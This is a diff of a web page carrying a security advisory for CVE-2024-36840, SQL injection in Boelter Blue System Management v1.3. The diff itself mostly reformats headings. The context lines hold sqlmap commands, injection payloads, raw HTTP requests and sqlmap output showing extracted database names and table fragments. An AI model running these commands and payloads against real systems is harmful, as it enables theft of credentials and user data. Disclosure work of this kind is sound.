@@ -455,18 +455,6 @@
         
       
       
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Boelter Blue System Management v1.3
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -477,172 +465,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#overview" class="md-nav__link">
-    <span class="md-ellipsis">
-      Overview
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#affected-component" class="md-nav__link">
-    <span class="md-ellipsis">
-      Affected Component
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#poc-example" class="md-nav__link">
-    <span class="md-ellipsis">
-      PoC Example
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#injection-types" class="md-nav__link">
-    <span class="md-ellipsis">
-      Injection Types:
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#http-requests" class="md-nav__link">
-    <span class="md-ellipsis">
-      HTTP Requests:
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#impact" class="md-nav__link">
-    <span class="md-ellipsis">
-      Impact
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#technical-details" class="md-nav__link">
-    <span class="md-ellipsis">
-      Technical Details
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Technical Details">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#database-information" class="md-nav__link">
-    <span class="md-ellipsis">
-      Database Information
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Database Information">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#extracted-databases" class="md-nav__link">
-    <span class="md-ellipsis">
-      Extracted Databases
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#sample-extracted-data" class="md-nav__link">
-    <span class="md-ellipsis">
-      Sample Extracted Data
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mitigation" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#references" class="md-nav__link">
-    <span class="md-ellipsis">
-      References
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#disclosure-timeline" class="md-nav__link">
-    <span class="md-ellipsis">
-      Disclosure Timeline
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#cve-information" class="md-nav__link">
-    <span class="md-ellipsis">
-      CVE Information
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#contact-information" class="md-nav__link">
-    <span class="md-ellipsis">
-      Contact Information
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
       
     </li>
   
@@ -775,9 +597,9 @@
 <strong>Vendor</strong>: Boelter Blue (<a href="https://www.boelter.com/">boelter.com</a>)<br />
 <strong>Software Link</strong>: <a href="https://play.google.com/store/apps/details?id=com.anchor5digital.anchor5adminapp&amp;hl=en_US">Google Play Store</a><br />
 <strong>Tested on</strong>: Linux Debian 9 (stretch), Apache 2.4.25, MySQL &gt;= 5.0.12  </p>
-<h2 id="overview">Overview</h2>
+<h1 id="overview">Overview</h1>
 <p>Boelter Blue System Management v1.3 has been found to contain multiple critical SQL injection vulnerabilities. These vulnerabilities allow attackers to execute arbitrary SQL queries, potentially leading to sensitive data exposure, unauthorized access, and complete control over the affected database.</p>
-<h2 id="affected-component">Affected Component</h2>
+<h1 id="affected-component">Affected Component</h1>
 <blockquote>
 <p>news_details.php<br />
 services.php<br />
@@ -787,7 +609,7 @@ location_details.php</p>
 <li>section parameter</li>
 </ul>
 </blockquote>
-<h2 id="poc-example">PoC Example</h2>
+<h1 id="poc-example">PoC Example</h1>
 <p><strong>SQLMap Injection</strong>: <br />
 <code>sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --dbs</code></p>
 <p><strong>news_details.php?id</strong> parameter:<br />
@@ -796,7 +618,7 @@ location_details.php</p>
 <code>sqlmap -u "https://www.example.com/services.php?section=5081" --random-agent --tamper=space2comment --threads=8 --dbs</code></p>
 <p><strong>location_details.php?id</strong> parameter:<br />
 <code>sqlmap -u "https://www.example.com/location_details.php?id=836" --random-agent --dbms=mysql --dbs</code></p>
-<h2 id="injection-types">Injection Types:</h2>
+<h1 id="injection-types">Injection Types:</h1>
 <div class="highlight"><pre><span></span><code>Boolean-based blind
 Parameter: id (GET)
 Type: boolean-based blind
@@ -816,7 +638,7 @@ Type: UNION query
 Title: Generic UNION query (NULL) - 8 columns
 Payload: id=-5298 UNION ALL SELECT NULL,NULL,CONCAT(0x717a787671,0x4d7065654c5a5547576a676c6c4d676f574b475a504a5369644c636a57525a7478684c4f56676561,0x71767a7671),NULL,NULL,NULL,NULL,NULL-- -
 </code></pre></div>
-<h2 id="http-requests">HTTP Requests:</h2>
+<h1 id="http-requests">HTTP Requests:</h1>
 <div class="highlight"><pre><span></span><code>Boolean-based blind
 
     GET /news_details.php?id=10071 AND 1452=1452 HTTP/1.1
@@ -852,7 +674,7 @@ Union-based injection
     Connection: keep-alive
     Upgrade-Insecure-Requests: 1
 </code></pre></div>
-<h2 id="impact">Impact</h2>
+<h1 id="impact">Impact</h1>
 <p>These vulnerabilities can be exploited to achieve the following:</p>
 <ul>
 <li><strong>Data Exfiltration</strong>: Admin credentials, user email/password hashes, device hashes, user PII, purchase history, and database credentials.</li>
@@ -860,12 +682,12 @@ Union-based injection
 <li><strong>Account Takeover</strong>: By retrieving and decrypting user credentials.</li>
 <li><strong>Full Database Access</strong>: Ability to read, modify, and delete any data in the database.</li>
 </ul>
-<h2 id="technical-details">Technical Details</h2>
-<h3 id="database-information">Database Information</h3>
+<h1 id="technical-details">Technical Details</h1>
+<h1 id="database-information">Database Information</h1>
 <p><strong>DBMS</strong>: MySQL &gt;= 5.0.12<br />
 <strong>Web Server</strong>: Apache 2.4.25<br />
 <strong>Operating System</strong>: Linux Debian 9 (stretch)</p>
-<h4 id="extracted-databases">Extracted Databases</h4>
+<h1 id="extracted-databases">Extracted Databases</h1>
 <div class="highlight"><pre><span></span><code>available databases [5]:
 [*] Anchor5Digital
 [*] information_schema
@@ -873,7 +695,7 @@ Union-based injection
 [*] performance_schema
 [*] sys
 </code></pre></div>
-<h4 id="sample-extracted-data">Sample Extracted Data</h4>
+<h1 id="sample-extracted-data">Sample Extracted Data</h1>
 <p><strong>Database: Anchor5Digital</strong></p>
 <p><strong>Table: DatabaseConnection</strong></p>
 <div class="highlight"><pre><span></span><code>+----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+
@@ -925,20 +747,20 @@ Union-based injection
 | root            |
 +-----------------+
 </code></pre></div>
-<h2 id="mitigation">Mitigation</h2>
+<h1 id="mitigation">Mitigation</h1>
 <p>To mitigate these vulnerabilities, it is recommended to:</p>
 <ul>
 <li><strong>Validate and Sanitize User Inputs</strong>: Ensure that all user-supplied data is properly validated and sanitized before being processed by the application.</li>
 <li><strong>Use Parameterized Queries</strong>: Implement parameterized queries or prepared statements to prevent SQL injection.</li>
 <li><strong>Implement a WAF</strong>: Deploy a Web Application Firewall to detect and block SQL injection attempts.</li>
 </ul>
-<h2 id="references">References</h2>
+<h1 id="references">References</h1>
 <ul>
 <li><a href="https://www.boelter.com/">Boelter Blue Homepage</a></li>
 <li><a href="https://play.google.com/store/apps/details?id=com.anchor5digital.anchor5adminapp&amp;hl=en_US">Google Play Store</a></li>
 <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36840">CVE - MITRE</a></li>
 </ul>
-<h2 id="disclosure-timeline">Disclosure Timeline</h2>
+<h1 id="disclosure-timeline">Disclosure Timeline</h1>
 <ul>
 <li><strong>2023</strong>: Vulnerabilities discovered by CBKB team.</li>
 <li><strong>2023</strong>: Vendor notified.</li>
@@ -948,11 +770,11 @@ Union-based injection
 <li><strong>2024-06-4</strong>: Exploit disclosed to exploit-db</li>
 <li><strong>2024-06-4</strong>: Exploit disclosed to packetstorm</li>
 </ul>
-<h2 id="cve-information">CVE Information</h2>
+<h1 id="cve-information">CVE Information</h1>
 <ul>
 <li><strong>CVE ID</strong>: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36840">CVE-2024-36840</a></li>
 </ul>
-<h2 id="contact-information">Contact Information</h2>
+<h1 id="contact-information">Contact Information</h1>
 <p>For any questions or concerns regarding this vulnerability, please contact us at: infosecdb@protonmail.com</p>
 <hr />
 <p>[CBKB]-   DeadlyData, 
